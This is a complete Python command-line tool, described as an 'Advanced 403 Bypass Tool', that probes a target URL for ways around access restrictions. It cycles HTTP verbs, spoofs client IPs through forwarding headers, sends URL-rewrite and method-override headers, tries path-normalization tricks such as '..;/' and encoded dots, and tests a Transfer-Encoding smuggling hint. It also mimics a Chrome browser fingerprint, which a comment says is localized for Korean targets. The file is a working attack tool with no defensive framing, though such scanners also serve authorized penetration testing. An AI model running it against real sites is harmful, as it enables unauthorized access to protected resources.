#!/usr/bin/env python3
import requests
import argparse
import sys
from urllib.parse import urlparse, quote
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Color Codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# Global Verbose Flag
VERBOSE = False

# Global Session
session = requests.Session()

def print_result(technique, payload, status, length, baseline_status=None, baseline_length=None):
    color = RESET
    if status == 200:
        color = GREEN
    elif status in [201, 202, 204]:
        color = GREEN
    elif status in [301, 302, 307, 308]:
        color = YELLOW
    elif status in [401, 403]:
        color = RED
    elif status >= 500:
        color = MAGENTA
    else:
        color = CYAN
    
    is_interesting = False
    
    if baseline_status and status != baseline_status:
        is_interesting = True
    
    if baseline_length and length != baseline_length:
        diff = abs(length - baseline_length)
        if diff > 100: 
             is_interesting = True

    if status == 200:
        is_interesting = True
        
    marker = "[+]" if is_interesting else "[-]"
    
    # Print if interesting OR if verbose is on
    if is_interesting or VERBOSE:
        msg = f"{color}{marker} {technique} | Payload: {payload} | Status: {status} | Size: {length}{RESET}"
        print(msg)

def get_baseline(url, proxies=None, verify=False):
    try:
        r = session.get(url, proxies=proxies, verify=verify, allow_redirects=False, timeout=10)
        return r.status_code, len(r.content)
    except Exception as e:
        print(f"{RED}Error connecting to target: {e}{RESET}")
        print(f"{YELLOW}Hint: The target might be blocking Python requests. Try using a proxy or check if the site is accessible.{RESET}")
        sys.exit(1)

def check_verbs(url, proxies, verify, baseline_status, baseline_length):
    print(f"\n{YELLOW}[*] Testing HTTP Verbs...{RESET}")
    verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'PROPFIND', 'OPTIONS', 'TRACE', 'CONNECT', 'INVENTED']
    
    for verb in verbs:
        try:
            r = session.request(verb, url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
            print_result(f"Verb {verb}", verb, r.status_code, len(r.content), baseline_status, baseline_length)
        except requests.exceptions.RequestException:
            pass

def check_headers(url, proxies, verify, baseline_status, baseline_length):
    print(f"\n{YELLOW}[*] Testing Headers (IP Spoofing & Rewrites)...{RESET}")
    
    # We update session headers temporarily for these checks
    original_headers = dict(session.headers)

    ip_headers = [
        'X-Originating-IP', 'X-Forwarded-For', 'X-Forwarded', 'Forwarded-For',
        'X-Remote-IP', 'X-Remote-Addr', 'X-ProxyUser-Ip', 'Client-IP',
        'True-Client-IP', 'Cluster-Client-IP', 'X-Client-IP', 'X-Real-IP'
    ]
    ip_values = ['127.0.0.1', 'localhost', '0.0.0.0', '192.168.1.1', '10.0.0.1']
    
    for header in ip_headers:
        for val in ip_values:
            session.headers.update({header: val})
            try:
                r = session.get(url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
                print_result(f"Header-IP", f"{header}: {val}", r.status_code, len(r.content), baseline_status, baseline_length)
            except: pass
            finally:
                session.headers = dict(original_headers) # Restore

    # URL Rewrite Headers
    parsed = urlparse(url)
    target_path = parsed.path
    if not target_path: target_path = "/"
    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    
    rewrite_headers = ['X-Original-URL', 'X-Rewrite-URL', 'X-Override-URL', 'X-Forwarded-URL']
    
    for h in rewrite_headers:
        session.headers.update({h: target_path})
        try:
            r = session.get(base_url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
            print_result(f"Header-Rewrite", f"GET / + {h}: {target_path}", r.status_code, len(r.content), baseline_status, baseline_length)
        except: pass
        finally:
             session.headers = dict(original_headers)

    # Method Override
    override_headers = {'X-HTTP-Method-Override': 'POST', 'X-HTTP-Method': 'POST', 'X-Method-Override': 'POST'}
    for k,v in override_headers.items():
        session.headers.update({k: v})
        try:
             r = session.get(url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
             print_result(f"Header-Method", f"{k}: {v}", r.status_code, len(r.content), baseline_status, baseline_length)
        except: pass
        finally:
             session.headers = dict(original_headers)

def check_paths(url, proxies, verify, baseline_status, baseline_length):
    print(f"\n{YELLOW}[*] Testing Path Manipulation (Tomcat, Nginx, normalization)...{RESET}")
    
    parsed = urlparse(url)
    path = parsed.path
    if not path or path == '/':
        path = '' 
    
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    clean_path = path.lstrip('/')
    
    variations = []
    
    if path:
        variations.append(f"/{clean_path}/.")
        variations.append(f"//%2e//{clean_path}")
        variations.append(f"/./{clean_path}/./")
        variations.append(f"/{clean_path}%20")
        variations.append(f"/{clean_path}%09")
        variations.append(f"/{clean_path}?")
        variations.append(f"/{clean_path}??")
        variations.append(f"///{clean_path}//")
        variations.append(f"/{clean_path}/")
        variations.append(f"/{clean_path}/..;/")
        variations.append(f"/{clean_path.upper()}")
        variations.append(f"/{clean_path.swapcase()}")
        variations.append(f"/{quote(clean_path)}")
        variations.append(f"/{clean_path};")
        variations.append(f"/{clean_path};/")
        variations.append(f"/{clean_path};.css")
        variations.append(f"/{clean_path};.js")
        variations.append(f"/{clean_path};index.html")
        variations.append(f"/{clean_path};param=value")
        variations.append(f"/;/{clean_path}")
        variations.append(f"/.;/{clean_path}")
        
        extensions = ['.json', '.html', '.xml', '.php', '.aspx', '.jsp']
        for ext in extensions:
             variations.append(f"/{clean_path}{ext}")
             variations.append(f"/{clean_path}/{ext}")

        variations.append(f"\\{clean_path}")
        variations.append(f"/.\\{clean_path}")
        
    else:
        if not url.endswith('/'):
             variations.append(f"/")
             variations.append(f"/..;/")
             variations.append(f"/;index.html")
        else:
             variations.append(f"..;/")
             variations.append(f";index.html")

    for v in variations:
        if v.startswith('/'):
            final_url = f"{base_url}{v}"
        else:
            final_url = f"{url}{v}"

        try:
            r = session.get(final_url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
            print_result("Path", v, r.status_code, len(r.content), baseline_status, baseline_length)
        except requests.exceptions.RequestException:
             pass

def check_protocol_pollution(url, proxies, verify, baseline_status, baseline_length):
    print(f"\n{YELLOW}[*] Testing Protocol Pollution / Smuggling hints...{RESET}")
    
    try:
        r = session.post(url, data={'_method': 'POST'}, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
        print_result("Pollution", "POST + _method=POST", r.status_code, len(r.content), baseline_status, baseline_length)
    except: pass
    
    original_headers = dict(session.headers)
    session.headers.update({'Transfer-Encoding': 'chunked'})
    try:
        r = session.get(url, proxies=proxies, verify=verify, allow_redirects=False, timeout=5)
        print_result("Smuggling", "Transfer-Encoding: chunked", r.status_code, len(r.content), baseline_status, baseline_length)
    except: pass
    finally:
         session.headers = dict(original_headers)

def validate_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        return 'http://' + url
    return url

def main():
    global VERBOSE
    parser = argparse.ArgumentParser(description="Advanced 403 Bypass Tool with Session Reuse")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--insecure", action="store_true", help="Skip SSL verification")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show all attempts")
    
    args = parser.parse_args()
    VERBOSE = args.verbose
    
    target_url = validate_url(args.url)
    
    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
        
    verify = not args.insecure

    
    # Configure Global Session with a realistic browser fingerprint
    # Using a modern Chrome on Windows User-Agent for maximum compatibility
    val_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    
    session.headers.update({
        'User-Agent': val_ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', # Localized for KR target compatibility
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
    })
    
    print(f"{CYAN}Targeting: {target_url}{RESET}")
    print(f"{CYAN}Using User-Agent: {val_ua}{RESET}")
    if proxies:
        print(f"{CYAN}Using Proxy: {args.proxy}{RESET}")
        
    try:
        b_status, b_length = get_baseline(target_url, proxies, verify)
        print(f"{CYAN}Baseline :: Status: {b_status}, Length: {b_length}{RESET}")
        
        check_verbs(target_url, proxies, verify, b_status, b_length)
        check_headers(target_url, proxies, verify, b_status, b_length)
        check_paths(target_url, proxies, verify, b_status, b_length)
        check_protocol_pollution(target_url, proxies, verify, b_status, b_length)
        
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrupted by user.{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Unexpected error: {e}{RESET}")
        print(f"{YELLOW}Hint: Connection timeouts often mean the server is dropping packets from your IP.{RESET}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
